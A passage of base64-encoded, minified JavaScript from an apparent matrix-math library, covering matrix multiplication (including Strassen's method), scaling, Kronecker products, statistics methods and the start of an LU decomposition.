GUubGVuZ3RoO3MrKyl0Kz1lW3NdKm5bc107cmV0dXJuIHR9bW11bChuKXtuPWIuY2hlY2tNYXRyaXgobik7bGV0IGU9dGhpcy5yb3dzLHQ9dGhpcy5jb2x1bW5zLHM9bi5jb2x1bW5zLHI9bmV3IGIoZSxzKSxpPW5ldyBGbG9hdDY0QXJyYXkodCk7Zm9yKGxldCBoPTA7aDxzO2grKyl7Zm9yKGxldCBsPTA7bDx0O2wrKylpW2xdPW4uZ2V0KGwsaCk7Zm9yKGxldCBsPTA7bDxlO2wrKyl7bGV0IHU9MDtmb3IobGV0IGY9MDtmPHQ7ZisrKXUrPXRoaXMuZ2V0KGwsZikqaVtmXTtyLnNldChsLGgsdSl9fXJldHVybiByfXN0cmFzc2VuMngyKG4pe249Yi5jaGVja01hdHJpeChuKTtsZXQgZT1uZXcgYigyLDIpO2NvbnN0IHQ9dGhpcy5nZXQoMCwwKSxzPW4uZ2V0KDAsMCkscj10aGlzLmdldCgwLDEpLGk9bi5nZXQoMCwxKSxoPXRoaXMuZ2V0KDEsMCksbD1uLmdldCgxLDApLHU9dGhpcy5nZXQoMSwxKSxmPW4uZ2V0KDEsMSksZz0odCt1KSoocytmKSxhPShoK3UpKnMsaj10KihpLWYpLHc9dSoobC1zKSx5PSh0K3IpKmYsbT0oaC10KSoocytpKSxNPShyLXUpKihsK2YpLFQ9Zyt3LXkrTSxFPWoreSxrPWErdyxSPWctYStqK207cmV0dXJuIGUuc2V0KDAsMCxUKSxlLnNldCgwLDEsRSksZS5zZXQoMSwwLGspLGUuc2V0KDEsMSxSKSxlfXN0cmFzc2VuM3gzKG4pe249Yi5jaGVja01hdHJpeChuKTtsZXQgZT1uZXcgYigzLDMpO2NvbnN0IHQ9dGhpcy5nZXQoMCwwKSxzPXRoaXMuZ2V0KDAsMSkscj10aGlzLmdldCgwLDIpLGk9dGhpcy5nZXQoMSwwKSxoPXRoaXMuZ2V0KDEsMSksbD10aGlzLmdldCgxLDIpLHU9dGhpcy5nZXQoMiwwKSxmPXRoaXMuZ2V0KDIsMSksZz10aGlzLmdldCgyLDIpLGE9bi5nZXQoMCwwKSxqPW4uZ2V0KDAsMSksdz1uLmdldCgwLDIpLHk9bi5nZXQoMSwwKSxtPW4uZ2V0KDEsMSksTT1uLmdldCgxLDIpLFQ9bi5nZXQoMiwwKSxFPW4uZ2V0KDIsMSksaz1uLmdldCgyLDIpLFI9KHQrcytyLWktaC1mLWcpKm0scT0odC1pKSooLWorbSksST1oKigtYStqK3ktbS1NLVQrayksej0oLXQraStoKSooYS1qK20pLEI9KGkraCkqKC1hK2opLGM9dCphLHA9KC10K3UrZikqKGEtdytNKSxTPSgtdCt1KSoody1NKSxkPSh1K2YpKigtYSt3KSxEPSh0K3Mrci1oLWwtdS1mKSpNLFU9ZiooLWErdyt5LW0tTS1UK0UpLEY9KC1yK2YrZykqKG0rVC1FKSxQPShyLWcpKihtLUUpLFk9cipULEc9KGYrZykqKC1UK0UpLE49KC1yK2grbCkqKE0rVC1rKSwkPShyLWwpKihNLWspLEs9KGgrbCkqKC1UK2spLHY9cyp5LFY9bCpFLEw9aSp3LEM9dSpqLFg9ZyprLHd0PWMrWSt2LHB0PVIreitCK2MrRitZK0csZHQ9YytwK2QrRCtZK04rSyxpdD1xK0kreitjK1krTiskLGx0PXEreitCK2MrVixodD1ZK04rJCtLK0wsanQ9YytwK1MrVStGK1ArWSx1dD1GK1ArWStHK0Msa3Q9YytwK1MrZCtYO3JldHVybiBlLnNldCgwLDAsd3QpLGUuc2V0KDAsMSxwdCksZS5zZXQoMCwyLGR0KSxlLnNldCgxLDAsaXQpLGUuc2V0KDEsMSxsdCksZS5zZXQoMSwyLGh0KSxlLnNldCgyLDAsanQpLGUuc2V0KDIsMSx1dCksZS5zZXQoMiwyLGt0KSxlfW1tdWxTdHJhc3NlbihuKXtuPWIuY2hlY2tNYXRyaXgobik7bGV0IGU9dGhpcy5jbG9uZSgpLHQ9ZS5yb3dzLHM9ZS5jb2x1bW5zLHI9bi5yb3dzLGk9bi5jb2x1bW5zO3MhPT1yJiZjb25zb2xlLndhcm4oYE11bHRpcGx5aW5nICR7dH0geCAke3N9IGFuZCAke3J9IHggJHtpfSBtYXRyaXg6IGRpbWVuc2lvbnMgZG8gbm90IG1hdGNoLmApO2Z1bmN0aW9uIGgoZyxhLGope2xldCB3PWcucm93cyx5PWcuY29sdW1ucztpZih3PT09YSYmeT09PWopcmV0dXJuIGc7e2xldCBtPV8uemVyb3MoYSxqKTtyZXR1cm4gbT1tLnNldFN1Yk1hdHJpeChnLDAsMCksbX19bGV0IGw9TWF0aC5tYXgodCxyKSx1PU1hdGgubWF4KHMsaSk7ZT1oKGUsbCx1KSxuPWgobixsLHUpO2Z1bmN0aW9uIGYoZyxhLGosdyl7aWYoajw9NTEyfHx3PD01MTIpcmV0dXJuIGcubW11bChhKTtqJTI9PT0xJiZ3JTI9PT0xPyhnPWgoZyxqKzEsdysxKSxhPWgoYSxqKzEsdysxKSk6aiUyPT09MT8oZz1oKGcsaisxLHcpLGE9aChhLGorMSx3KSk6dyUyPT09MSYmKGc9aChnLGosdysxKSxhPWgoYSxqLHcrMSkpO2xldCB5PXBhcnNlSW50KGcucm93cy8yLDEwKSxtPXBhcnNlSW50KGcuY29sdW1ucy8yLDEwKSxNPWcuc3ViTWF0cml4KDAseS0xLDAsbS0xKSxUPWEuc3ViTWF0cml4KDAseS0xLDAsbS0xKSxFPWcuc3ViTWF0cml4KDAseS0xLG0sZy5jb2x1bW5zLTEpLGs9YS5zdWJNYXRyaXgoMCx5LTEsbSxhLmNvbHVtbnMtMSksUj1nLnN1Yk1hdHJpeCh5LGcucm93cy0xLDAsbS0xKSxxPWEuc3ViTWF0cml4KHksYS5yb3dzLTEsMCxtLTEpLEk9Zy5zdWJNYXRyaXgoeSxnLnJvd3MtMSxtLGcuY29sdW1ucy0xKSx6PWEuc3ViTWF0cml4KHksYS5yb3dzLTEsbSxhLmNvbHVtbnMtMSksQj1mKF8uYWRkKE0sSSksXy5hZGQoVCx6KSx5LG0pLGM9ZihfLmFkZChSLEkpLFQseSxtKSxwPWYoTSxfLnN1YihrLHopLHksbSksUz1mKEksXy5zdWIocSxUKSx5LG0pLGQ9ZihfLmFkZChNLEUpLHoseSxtKSxEPWYoXy5zdWIoUixNKSxfLmFkZChULGspLHksbSksVT1mKF8uc3ViKEUsSSksXy5hZGQocSx6KSx5LG0pLEY9Xy5hZGQoQixTKTtGLnN1YihkKSxGLmFkZChVKTtsZXQgUD1fLmFkZChwLGQpLFk9Xy5hZGQoYyxTKSxHPV8uc3ViKEIsYyk7Ry5hZGQocCksRy5hZGQoRCk7bGV0IE49Xy56ZXJvcygyKkYucm93cywyKkYuY29sdW1ucyk7cmV0dXJuIE49Ti5zZXRTdWJNYXRyaXgoRiwwLDApLE49Ti5zZXRTdWJNYXRyaXgoUCxGLnJvd3MsMCksTj1OLnNldFN1Yk1hdHJpeChZLDAsRi5jb2x1bW5zKSxOPU4uc2V0U3ViTWF0cml4KEcsRi5yb3dzLEYuY29sdW1ucyksTi5zdWJNYXRyaXgoMCxqLTEsMCx3LTEpfXJldHVybiBmKGUsbixsLHUpfXNjYWxlUm93cyhuPXt9KXtpZih0eXBlb2YgbiE9Im9iamVjdCIpdGhyb3cgbmV3IFR5cGVFcnJvcigib3B0aW9ucyBtdXN0IGJlIGFuIG9iamVjdCIpO2NvbnN0e21pbjplPTAsbWF4OnQ9MX09bjtpZighTnVtYmVyLmlzRmluaXRlKGUpKXRocm93IG5ldyBUeXBlRXJyb3IoIm1pbiBtdXN0IGJlIGEgbnVtYmVyIik7aWYoIU51bWJlci5pc0Zpbml0ZSh0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJtYXggbXVzdCBiZSBhIG51bWJlciIpO2lmKGU+PXQpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIm1pbiBtdXN0IGJlIHNtYWxsZXIgdGhhbiBtYXgiKTtsZXQgcz1uZXcgYih0aGlzLnJvd3MsdGhpcy5jb2x1bW5zKTtmb3IobGV0IHI9MDtyPHRoaXMucm93cztyKyspe2NvbnN0IGk9dGhpcy5nZXRSb3cocik7aS5sZW5ndGg+MCYmcXQoaSx7bWluOmUsbWF4OnQsb3V0cHV0Oml9KSxzLnNldFJvdyhyLGkpfXJldHVybiBzfXNjYWxlQ29sdW1ucyhuPXt9KXtpZih0eXBlb2YgbiE9Im9iamVjdCIpdGhyb3cgbmV3IFR5cGVFcnJvcigib3B0aW9ucyBtdXN0IGJlIGFuIG9iamVjdCIpO2NvbnN0e21pbjplPTAsbWF4OnQ9MX09bjtpZighTnVtYmVyLmlzRmluaXRlKGUpKXRocm93IG5ldyBUeXBlRXJyb3IoIm1pbiBtdXN0IGJlIGEgbnVtYmVyIik7aWYoIU51bWJlci5pc0Zpbml0ZSh0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJtYXggbXVzdCBiZSBhIG51bWJlciIpO2lmKGU+PXQpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIm1pbiBtdXN0IGJlIHNtYWxsZXIgdGhhbiBtYXgiKTtsZXQgcz1uZXcgYih0aGlzLnJvd3MsdGhpcy5jb2x1bW5zKTtmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspe2NvbnN0IGk9dGhpcy5nZXRDb2x1bW4ocik7aS5sZW5ndGgmJnF0KGkse21pbjplLG1heDp0LG91dHB1dDppfSkscy5zZXRDb2x1bW4ocixpKX1yZXR1cm4gc31mbGlwUm93cygpe2NvbnN0IG49TWF0aC5jZWlsKHRoaXMuY29sdW1ucy8yKTtmb3IobGV0IGU9MDtlPHRoaXMucm93cztlKyspZm9yKGxldCB0PTA7dDxuO3QrKyl7bGV0IHM9dGhpcy5nZXQoZSx0KSxyPXRoaXMuZ2V0KGUsdGhpcy5jb2x1bW5zLTEtdCk7dGhpcy5zZXQoZSx0LHIpLHRoaXMuc2V0KGUsdGhpcy5jb2x1bW5zLTEtdCxzKX1yZXR1cm4gdGhpc31mbGlwQ29sdW1ucygpe2NvbnN0IG49TWF0aC5jZWlsKHRoaXMucm93cy8yKTtmb3IobGV0IGU9MDtlPHRoaXMuY29sdW1ucztlKyspZm9yKGxldCB0PTA7dDxuO3QrKyl7bGV0IHM9dGhpcy5nZXQodCxlKSxyPXRoaXMuZ2V0KHRoaXMucm93cy0xLXQsZSk7dGhpcy5zZXQodCxlLHIpLHRoaXMuc2V0KHRoaXMucm93cy0xLXQsZSxzKX1yZXR1cm4gdGhpc31rcm9uZWNrZXJQcm9kdWN0KG4pe249Yi5jaGVja01hdHJpeChuKTtsZXQgZT10aGlzLnJvd3MsdD10aGlzLmNvbHVtbnMscz1uLnJvd3Mscj1uLmNvbHVtbnMsaT1uZXcgYihlKnMsdCpyKTtmb3IobGV0IGg9MDtoPGU7aCsrKWZvcihsZXQgbD0wO2w8dDtsKyspZm9yKGxldCB1PTA7dTxzO3UrKylmb3IobGV0IGY9MDtmPHI7ZisrKWkuc2V0KHMqaCt1LHIqbCtmLHRoaXMuZ2V0KGgsbCkqbi5nZXQodSxmKSk7cmV0dXJuIGl9a3JvbmVja2VyU3VtKG4pe2lmKG49Yi5jaGVja01hdHJpeChuKSwhdGhpcy5pc1NxdWFyZSgpfHwhbi5pc1NxdWFyZSgpKXRocm93IG5ldyBFcnJvcigiS3JvbmVja2VyIFN1bSBuZWVkcyB0d28gU3F1YXJlIE1hdHJpY2VzIik7bGV0IGU9dGhpcy5yb3dzLHQ9bi5yb3dzLHM9dGhpcy5rcm9uZWNrZXJQcm9kdWN0KGIuZXllKHQsdCkpLHI9Yi5leWUoZSxlKS5rcm9uZWNrZXJQcm9kdWN0KG4pO3JldHVybiBzLmFkZChyKX10cmFuc3Bvc2UoKXtsZXQgbj1uZXcgYih0aGlzLmNvbHVtbnMsdGhpcy5yb3dzKTtmb3IobGV0IGU9MDtlPHRoaXMucm93cztlKyspZm9yKGxldCB0PTA7dDx0aGlzLmNvbHVtbnM7dCsrKW4uc2V0KHQsZSx0aGlzLmdldChlLHQpKTtyZXR1cm4gbn1zb3J0Um93cyhuPVB0KXtmb3IobGV0IGU9MDtlPHRoaXMucm93cztlKyspdGhpcy5zZXRSb3coZSx0aGlzLmdldFJvdyhlKS5zb3J0KG4pKTtyZXR1cm4gdGhpc31zb3J0Q29sdW1ucyhuPVB0KXtmb3IobGV0IGU9MDtlPHRoaXMuY29sdW1ucztlKyspdGhpcy5zZXRDb2x1bW4oZSx0aGlzLmdldENvbHVtbihlKS5zb3J0KG4pKTtyZXR1cm4gdGhpc31zdWJNYXRyaXgobixlLHQscyl7RnQodGhpcyxuLGUsdCxzKTtsZXQgcj1uZXcgYihlLW4rMSxzLXQrMSk7Zm9yKGxldCBpPW47aTw9ZTtpKyspZm9yKGxldCBoPXQ7aDw9cztoKyspci5zZXQoaS1uLGgtdCx0aGlzLmdldChpLGgpKTtyZXR1cm4gcn1zdWJNYXRyaXhSb3cobixlLHQpe2lmKGU9PT12b2lkIDAmJihlPTApLHQ9PT12b2lkIDAmJih0PXRoaXMuY29sdW1ucy0xKSxlPnR8fGU8MHx8ZT49dGhpcy5jb2x1bW5zfHx0PDB8fHQ+PXRoaXMuY29sdW1ucyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigiQXJndW1lbnQgb3V0IG9mIHJhbmdlIik7bGV0IHM9bmV3IGIobi5sZW5ndGgsdC1lKzEpO2ZvcihsZXQgcj0wO3I8bi5sZW5ndGg7cisrKWZvcihsZXQgaT1lO2k8PXQ7aSsrKXtpZihuW3JdPDB8fG5bcl0+PXRoaXMucm93cyl0aHJvdyBuZXcgUmFuZ2VFcnJvcihgUm93IGluZGV4IG91dCBvZiByYW5nZTogJHtuW3JdfWApO3Muc2V0KHIsaS1lLHRoaXMuZ2V0KG5bcl0saSkpfXJldHVybiBzfXN1Yk1hdHJpeENvbHVtbihuLGUsdCl7aWYoZT09PXZvaWQgMCYmKGU9MCksdD09PXZvaWQgMCYmKHQ9dGhpcy5yb3dzLTEpLGU+dHx8ZTwwfHxlPj10aGlzLnJvd3N8fHQ8MHx8dD49dGhpcy5yb3dzKXRocm93IG5ldyBSYW5nZUVycm9yKCJBcmd1bWVudCBvdXQgb2YgcmFuZ2UiKTtsZXQgcz1uZXcgYih0LWUrMSxuLmxlbmd0aCk7Zm9yKGxldCByPTA7cjxuLmxlbmd0aDtyKyspZm9yKGxldCBpPWU7aTw9dDtpKyspe2lmKG5bcl08MHx8bltyXT49dGhpcy5jb2x1bW5zKXRocm93IG5ldyBSYW5nZUVycm9yKGBDb2x1bW4gaW5kZXggb3V0IG9mIHJhbmdlOiAke25bcl19YCk7cy5zZXQoaS1lLHIsdGhpcy5nZXQoaSxuW3JdKSl9cmV0dXJuIHN9c2V0U3ViTWF0cml4KG4sZSx0KXtpZihuPWIuY2hlY2tNYXRyaXgobiksbi5pc0VtcHR5KCkpcmV0dXJuIHRoaXM7bGV0IHM9ZStuLnJvd3MtMSxyPXQrbi5jb2x1bW5zLTE7RnQodGhpcyxlLHMsdCxyKTtmb3IobGV0IGk9MDtpPG4ucm93cztpKyspZm9yKGxldCBoPTA7aDxuLmNvbHVtbnM7aCsrKXRoaXMuc2V0KGUraSx0K2gsbi5nZXQoaSxoKSk7cmV0dXJuIHRoaXN9c2VsZWN0aW9uKG4sZSl7aWUodGhpcyxuKSxsZSh0aGlzLGUpO2xldCB0PW5ldyBiKG4ubGVuZ3RoLGUubGVuZ3RoKTtmb3IobGV0IHM9MDtzPG4ubGVuZ3RoO3MrKyl7bGV0IHI9bltzXTtmb3IobGV0IGk9MDtpPGUubGVuZ3RoO2krKyl7bGV0IGg9ZVtpXTt0LnNldChzLGksdGhpcy5nZXQocixoKSl9fXJldHVybiB0fXRyYWNlKCl7bGV0IG49TWF0aC5taW4odGhpcy5yb3dzLHRoaXMuY29sdW1ucyksZT0wO2ZvcihsZXQgdD0wO3Q8bjt0KyspZSs9dGhpcy5nZXQodCx0KTtyZXR1cm4gZX1jbG9uZSgpe2xldCBuPW5ldyBiKHRoaXMucm93cyx0aGlzLmNvbHVtbnMpO2ZvcihsZXQgZT0wO2U8dGhpcy5yb3dzO2UrKylmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0Kyspbi5zZXQoZSx0LHRoaXMuZ2V0KGUsdCkpO3JldHVybiBufXN1bShuKXtzd2l0Y2gobil7Y2FzZSJyb3ciOnJldHVybiBoZSh0aGlzKTtjYXNlImNvbHVtbiI6cmV0dXJuIHVlKHRoaXMpO2Nhc2Ugdm9pZCAwOnJldHVybiBjZSh0aGlzKTtkZWZhdWx0OnRocm93IG5ldyBFcnJvcihgaW52YWxpZCBvcHRpb246ICR7bn1gKX19cHJvZHVjdChuKXtzd2l0Y2gobil7Y2FzZSJyb3ciOnJldHVybiBmZSh0aGlzKTtjYXNlImNvbHVtbiI6cmV0dXJuIGdlKHRoaXMpO2Nhc2Ugdm9pZCAwOnJldHVybiBhZSh0aGlzKTtkZWZhdWx0OnRocm93IG5ldyBFcnJvcihgaW52YWxpZCBvcHRpb246ICR7bn1gKX19bWVhbihuKXtjb25zdCBlPXRoaXMuc3VtKG4pO3N3aXRjaChuKXtjYXNlInJvdyI6e2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKyllW3RdLz10aGlzLmNvbHVtbnM7cmV0dXJuIGV9Y2FzZSJjb2x1bW4iOntmb3IobGV0IHQ9MDt0PHRoaXMuY29sdW1uczt0KyspZVt0XS89dGhpcy5yb3dzO3JldHVybiBlfWNhc2Ugdm9pZCAwOnJldHVybiBlL3RoaXMuc2l6ZTtkZWZhdWx0OnRocm93IG5ldyBFcnJvcihgaW52YWxpZCBvcHRpb246ICR7bn1gKX19dmFyaWFuY2UobixlPXt9KXtpZih0eXBlb2Ygbj09Im9iamVjdCImJihlPW4sbj12b2lkIDApLHR5cGVvZiBlIT0ib2JqZWN0Iil0aHJvdyBuZXcgVHlwZUVycm9yKCJvcHRpb25zIG11c3QgYmUgYW4gb2JqZWN0Iik7Y29uc3R7dW5iaWFzZWQ6dD0hMCxtZWFuOnM9dGhpcy5tZWFuKG4pfT1lO2lmKHR5cGVvZiB0IT0iYm9vbGVhbiIpdGhyb3cgbmV3IFR5cGVFcnJvcigidW5iaWFzZWQgbXVzdCBiZSBhIGJvb2xlYW4iKTtzd2l0Y2gobil7Y2FzZSJyb3ciOntpZighVyhzKSl0aHJvdyBuZXcgVHlwZUVycm9yKCJtZWFuIG11c3QgYmUgYW4gYXJyYXkiKTtyZXR1cm4gbWUodGhpcyx0LHMpfWNhc2UiY29sdW1uIjp7aWYoIVcocykpdGhyb3cgbmV3IFR5cGVFcnJvcigibWVhbiBtdXN0IGJlIGFuIGFycmF5Iik7cmV0dXJuIHdlKHRoaXMsdCxzKX1jYXNlIHZvaWQgMDp7aWYodHlwZW9mIHMhPSJudW1iZXIiKXRocm93IG5ldyBUeXBlRXJyb3IoIm1lYW4gbXVzdCBiZSBhIG51bWJlciIpO3JldHVybiBwZSh0aGlzLHQscyl9ZGVmYXVsdDp0aHJvdyBuZXcgRXJyb3IoYGludmFsaWQgb3B0aW9uOiAke259YCl9fXN0YW5kYXJkRGV2aWF0aW9uKG4sZSl7dHlwZW9mIG49PSJvYmplY3QiJiYoZT1uLG49dm9pZCAwKTtjb25zdCB0PXRoaXMudmFyaWFuY2UobixlKTtpZihuPT09dm9pZCAwKXJldHVybiBNYXRoLnNxcnQodCk7Zm9yKGxldCBzPTA7czx0Lmxlbmd0aDtzKyspdFtzXT1NYXRoLnNxcnQodFtzXSk7cmV0dXJuIHR9Y2VudGVyKG4sZT17fSl7aWYodHlwZW9mIG49PSJvYmplY3QiJiYoZT1uLG49dm9pZCAwKSx0eXBlb2YgZSE9Im9iamVjdCIpdGhyb3cgbmV3IFR5cGVFcnJvcigib3B0aW9ucyBtdXN0IGJlIGFuIG9iamVjdCIpO2NvbnN0e2NlbnRlcjp0PXRoaXMubWVhbihuKX09ZTtzd2l0Y2gobil7Y2FzZSJyb3ciOntpZighVyh0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJjZW50ZXIgbXVzdCBiZSBhbiBhcnJheSIpO3JldHVybiBkZSh0aGlzLHQpLHRoaXN9Y2FzZSJjb2x1bW4iOntpZighVyh0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJjZW50ZXIgbXVzdCBiZSBhbiBhcnJheSIpO3JldHVybiB5ZSh0aGlzLHQpLHRoaXN9Y2FzZSB2b2lkIDA6e2lmKHR5cGVvZiB0IT0ibnVtYmVyIil0aHJvdyBuZXcgVHlwZUVycm9yKCJjZW50ZXIgbXVzdCBiZSBhIG51bWJlciIpO3JldHVybiBNZSh0aGlzLHQpLHRoaXN9ZGVmYXVsdDp0aHJvdyBuZXcgRXJyb3IoYGludmFsaWQgb3B0aW9uOiAke259YCl9fXNjYWxlKG4sZT17fSl7aWYodHlwZW9mIG49PSJvYmplY3QiJiYoZT1uLG49dm9pZCAwKSx0eXBlb2YgZSE9Im9iamVjdCIpdGhyb3cgbmV3IFR5cGVFcnJvcigib3B0aW9ucyBtdXN0IGJlIGFuIG9iamVjdCIpO2xldCB0PWUuc2NhbGU7c3dpdGNoKG4pe2Nhc2Uicm93Ijp7aWYodD09PXZvaWQgMCl0PUVlKHRoaXMpO2Vsc2UgaWYoIVcodCkpdGhyb3cgbmV3IFR5cGVFcnJvcigic2NhbGUgbXVzdCBiZSBhbiBhcnJheSIpO3JldHVybiBTZSh0aGlzLHQpLHRoaXN9Y2FzZSJjb2x1bW4iOntpZih0PT09dm9pZCAwKXQ9amUodGhpcyk7ZWxzZSBpZighVyh0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJzY2FsZSBtdXN0IGJlIGFuIGFycmF5Iik7cmV0dXJuIGtlKHRoaXMsdCksdGhpc31jYXNlIHZvaWQgMDp7aWYodD09PXZvaWQgMCl0PWJlKHRoaXMpO2Vsc2UgaWYodHlwZW9mIHQhPSJudW1iZXIiKXRocm93IG5ldyBUeXBlRXJyb3IoInNjYWxlIG11c3QgYmUgYSBudW1iZXIiKTtyZXR1cm4gSWUodGhpcyx0KSx0aGlzfWRlZmF1bHQ6dGhyb3cgbmV3IEVycm9yKGBpbnZhbGlkIG9wdGlvbjogJHtufWApfX10b1N0cmluZyhuKXtyZXR1cm4gVHQodGhpcyxuKX19Xy5wcm90b3R5cGUua2xhc3M9Ik1hdHJpeCIsdHlwZW9mIFN5bWJvbDwidSImJihfLnByb3RvdHlwZVtTeW1ib2wuZm9yKCJub2RlanMudXRpbC5pbnNwZWN0LmN1c3RvbSIpXT1uZSk7ZnVuY3Rpb24gUHQobyxuKXtyZXR1cm4gby1ufWZ1bmN0aW9uIFJlKG8pe3JldHVybiBvLmV2ZXJ5KG49PnR5cGVvZiBuPT0ibnVtYmVyIil9Xy5yYW5kb209Xy5yYW5kLF8ucmFuZG9tSW50PV8ucmFuZEludCxfLmRpYWdvbmFsPV8uZGlhZyxfLnByb3RvdHlwZS5kaWFnb25hbD1fLnByb3RvdHlwZS5kaWFnLF8uaWRlbnRpdHk9Xy5leWUsXy5wcm90b3R5cGUubmVnYXRlPV8ucHJvdG90eXBlLm5lZyxfLnByb3RvdHlwZS50ZW5zb3JQcm9kdWN0PV8ucHJvdG90eXBlLmtyb25lY2tlclByb2R1Y3Q7Y2xhc3MgYiBleHRlbmRzIF97Y29uc3RydWN0b3IobixlKXtpZihzdXBlcigpLGIuaXNNYXRyaXgobikpcmV0dXJuIG4uY2xvbmUoKTtpZihOdW1iZXIuaXNJbnRlZ2VyKG4pJiZuPj0wKWlmKHRoaXMuZGF0YT1bXSxOdW1iZXIuaXNJbnRlZ2VyKGUpJiZlPj0wKWZvcihsZXQgdD0wO3Q8bjt0KyspdGhpcy5kYXRhLnB1c2gobmV3IEZsb2F0NjRBcnJheShlKSk7ZWxzZSB0aHJvdyBuZXcgVHlwZUVycm9yKCJuQ29sdW1ucyBtdXN0IGJlIGEgcG9zaXRpdmUgaW50ZWdlciIpO2Vsc2UgaWYoVyhuKSl7Y29uc3QgdD1uO2lmKG49dC5sZW5ndGgsZT1uP3RbMF0ubGVuZ3RoOjAsdHlwZW9mIGUhPSJudW1iZXIiKXRocm93IG5ldyBUeXBlRXJyb3IoIkRhdGEgbXVzdCBiZSBhIDJEIGFycmF5IHdpdGggYXQgbGVhc3Qgb25lIGVsZW1lbnQiKTt0aGlzLmRhdGE9W107Zm9yKGxldCBzPTA7czxuO3MrKyl7aWYodFtzXS5sZW5ndGghPT1lKXRocm93IG5ldyBSYW5nZUVycm9yKCJJbmNvbnNpc3RlbnQgYXJyYXkgZGltZW5zaW9ucyIpO2lmKCFSZSh0W3NdKSl0aHJvdyBuZXcgVHlwZUVycm9yKCJJbnB1dCBkYXRhIGNvbnRhaW5zIG5vbi1udW1lcmljIHZhbHVlcyIpO3RoaXMuZGF0YS5wdXNoKEZsb2F0NjRBcnJheS5mcm9tKHRbc10pKX19ZWxzZSB0aHJvdyBuZXcgVHlwZUVycm9yKCJGaXJzdCBhcmd1bWVudCBtdXN0IGJlIGEgcG9zaXRpdmUgbnVtYmVyIG9yIGFuIGFycmF5Iik7dGhpcy5yb3dzPW4sdGhpcy5jb2x1bW5zPWV9c2V0KG4sZSx0KXtyZXR1cm4gdGhpcy5kYXRhW25dW2VdPXQsdGhpc31nZXQobixlKXtyZXR1cm4gdGhpcy5kYXRhW25dW2VdfXJlbW92ZVJvdyhuKXtyZXR1cm4gUSh0aGlzLG4pLHRoaXMuZGF0YS5zcGxpY2UobiwxKSx0aGlzLnJvd3MtPTEsdGhpc31hZGRSb3cobixlKXtyZXR1cm4gZT09PXZvaWQgMCYmKGU9bixuPXRoaXMucm93cyksUSh0aGlzLG4sITApLGU9RmxvYXQ2NEFycmF5LmZyb20odHQodGhpcyxlKSksdGhpcy5kYXRhLnNwbGljZShuLDAsZSksdGhpcy5yb3dzKz0xLHRoaXN9cmVtb3ZlQ29sdW1uKG4pe1oodGhpcyxuKTtmb3IobGV0IGU9MDtlPHRoaXMucm93cztlKyspe2NvbnN0IHQ9bmV3IEZsb2F0NjRBcnJheSh0aGlzLmNvbHVtbnMtMSk7Zm9yKGxldCBzPTA7czxuO3MrKyl0W3NdPXRoaXMuZGF0YVtlXVtzXTtmb3IobGV0IHM9bisxO3M8dGhpcy5jb2x1bW5zO3MrKyl0W3MtMV09dGhpcy5kYXRhW2VdW3NdO3RoaXMuZGF0YVtlXT10fXJldHVybiB0aGlzLmNvbHVtbnMtPTEsdGhpc31hZGRDb2x1bW4obixlKXt0eXBlb2YgZT4idSImJihlPW4sbj10aGlzLmNvbHVtbnMpLFoodGhpcyxuLCEwKSxlPWV0KHRoaXMsZSk7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKXtjb25zdCBzPW5ldyBGbG9hdDY0QXJyYXkodGhpcy5jb2x1bW5zKzEpO2xldCByPTA7Zm9yKDtyPG47cisrKXNbcl09dGhpcy5kYXRhW3RdW3JdO2ZvcihzW3IrK109ZVt0XTtyPHRoaXMuY29sdW1ucysxO3IrKylzW3JdPXRoaXMuZGF0YVt0XVtyLTFdO3RoaXMuZGF0YVt0XT1zfXJldHVybiB0aGlzLmNvbHVtbnMrPTEsdGhpc319cmUoXyxiKTtjbGFzcyBzdCBleHRlbmRzIF97Y29uc3RydWN0b3Iobil7c3VwZXIoKSx0aGlzLmRhdGE9bix0aGlzLnJvd3M9bi5sZW5ndGgsdGhpcy5jb2x1bW5zPW5bMF0ubGVuZ3RofXNldChuLGUsdCl7cmV0dXJuIHRoaXMuZGF0YVtuXVtlXT10LHRoaXN9Z2V0KG4sZSl7cmV0dXJuIHRoaXMuZGF0YVtuXVtlXX19Y2xhc3MgTmV7Y29uc3RydWN0b3Iobil7bj1zdC5jaGVja01hdHJpeChuKTtsZXQgZT1uLmNsb25lKCksdD1lLnJvd3Mscz1lLmNvbHVtbnMscj1uZXcgRmxvYXQ2NEFycmF5KHQpLGk9MSxoLGwsdSxmLGcsYSxqLHcseTtmb3IoaD0wO2g8dDtoKyspcltoXT1oO2Zvcih3PW5ldyBGbG9hdDY0QXJyYXkodCksbD0wO2w8cztsKyspe2ZvcihoPTA7aDx0O2grKyl3W2hdPWUuZ2V0KGgsbCk7Zm9yKGg9MDtoPHQ7aCsrKXtmb3IoeT1NYXRoLm1pbihoLGwpLGc9MCx1PTA7dTx5O3UrKylnKz1lLmdldChoLHUpKndbdV07d1toXS09ZyxlLnNldChoLGwsd1toXSl9Zm9yKGY9bCxoPWwrMTtoPHQ7aCsrKU1hdGguYWJzKHdbaF0pPk1hdGguYWJzKHdbZl0pJiYoZj1oKTtpZihmIT09bCl7Zm9yKHU9MDt1PHM7dSsrKWE9ZS5nZXQoZix1KSxlLnNldChmLHUsZS5nZXQobCx1KSksZS5zZXQobCx1LGEpO2o9cltmXSxyW2ZdPXJbbF0scltsXT1qLGk9LWl9aWYobDx0JiZlLmdldChsLGwpIT09MClmb3IoaD1sKzE7aDx0O2grKyllLnNldChoLGwsZS5nZXQoaCxsKS9lLmdldChsLGwpKX10aGlzLkxVPWUsdGhpcy5waXZvdFZlY3Rvcj1yLHRoaXMucGl2b3RTaWduPWl9aXNTaW5ndWxhcigpe2xldCBuPXRoaXMuTFUsZT1uLmNvbHVtbnM7Zm9yKGxldCB0PTA7dDxlO3QrKylpZihuLmdldCh0LHQpPT09MClyZXR1cm4hMDtyZXR1cm4hMX1zb2x2ZShuKXtuPWIuY2hlY2tNYXRyaXgobik7bGV0IGU9dGhpcy5MVTtpZihlLnJvd3MhPT1uLnJvd3MpdGhyb3cgbmV3IEVycm9yKCJ